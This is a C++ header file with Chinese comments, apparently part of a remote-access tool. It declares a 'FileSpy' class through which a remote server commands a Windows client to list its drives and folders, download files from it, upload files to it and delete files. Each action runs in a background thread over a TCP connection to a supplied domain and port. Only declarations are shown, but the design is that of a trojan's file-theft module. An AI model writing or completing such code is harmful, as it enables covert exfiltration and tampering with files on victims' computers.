/*
 *
 *  Author: sumkee911@gmail.com
 *  Date: 23-12-2016
 *  Brief: 实现查找，删除，下载，上传功能
 *
 */

#ifndef FILESPY_H
#define FILESPY_H

#include "tcpsocket.h"
#include <windows.h>
#include <iostream>
#include <map>
#include <vector>

class FileSpy
{
public:
    FileSpy();

    // 服务端向客户端发送的指令(你觉得有需要你也可以增加自己的指令)
    const std::string CmdGetDirFiles = "GET_DIRS_FILES";   // 获取路径下的所有文件名和路径名
    const std::string CmdDownloadFile = "DOWNLOAD_FILE";   // 服务端从客户也下载文件
    const std::string CmdUploadFile = "UPLOAD_FILE";       // 服务端上传文件到客户端
    const std::string CmdDeleteFile = "DELETE_FILE";       // 服务端在客户端删除文件

    // 客户端向服务端发送的指令(你觉得有需要你也可以增加自己的指令)
    const std::string CmdSendDrives = "SEND_DRIVES";        // 发送盘符
    const std::string CmdSendDirs = "SEND_DIRS";            // 发送路径下的所有路径名
    const std::string CmdSendFiles = "SEND_FILES";          // 发送路径下的所有文件名
    const std::string CmdDeleteFileSuccess = "DELETE_SUCCESS";  // 成功删除文件
    const std::string CmdDeleteFileFailed = "DELETE_FAILED";    // 删除文件失败

    // 分割符号和结束符号，比如获取文件夹所有文件命令:FILES<分割符>FILEA<文件分割符>FILEB<文件分割符>FILEC<结束符号>
    const std::string CmdSplit = ";";
    const std::string CmdEnd = "\r\n";
    const std::string CmdFileSplit = "|";

    // 这个类的入口函数
    static void startByNewThread(std::string domain, int port);
    static DWORD WINAPI fileSpyThreadProc(LPVOID args);
    static void startFileSpy(std::string domain, int port);

    // 命令解析函数
    static void addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int size);
    static std::map<std::string, std::string> parseArgs(std::string &data);
    static void processCmd(TcpSocket *sock, std::string &cmd, std::string &data);

    // 命令处理函数
    static void doGetDirFiles(TcpSocket *sock, std::map<std::string, std::string> &args);
    static void doDownloadFile(TcpSocket *sock, std::map<std::string, std::string> &args);
    static void doUploadFile(TcpSocket *sock, std::map<std::string, std::string> &args);
    static void doDeleteFile(TcpSocket *sock, std::map<std::string, std::string> &args);

    // 获取所有盘符
    static std::vector<std::string> getDrives();
    // 获取路径下的所有路径
    static std::vector<std::string> getDirs(std::string dir);
    // 获取路径下的所有文件
    static std::vector<std::string> getFiles(std::string dir);

    // 发送文件数据包头
    typedef struct {
        char fileName[256];
        unsigned int len;
    } FileHeader;

    // 发送文件入口函数
    static void startSendFileByNewThread(std::string filePath, std::string domain, int port);
    static DWORD WINAPI sendFileThreadProc(LPVOID args);
    static void startSendFile(std::string filePath, std::string domain, int port);

    // 接收文件入口函数
    static void startRecvFileByNewThread(std::string filePath, std::string domain, int port);
    static DWORD WINAPI recvFileThreadProc(LPVOID args);
    static void startRecvFile(std::string filePath, std::string domain, int port);
};

#endif // FILESPY_H
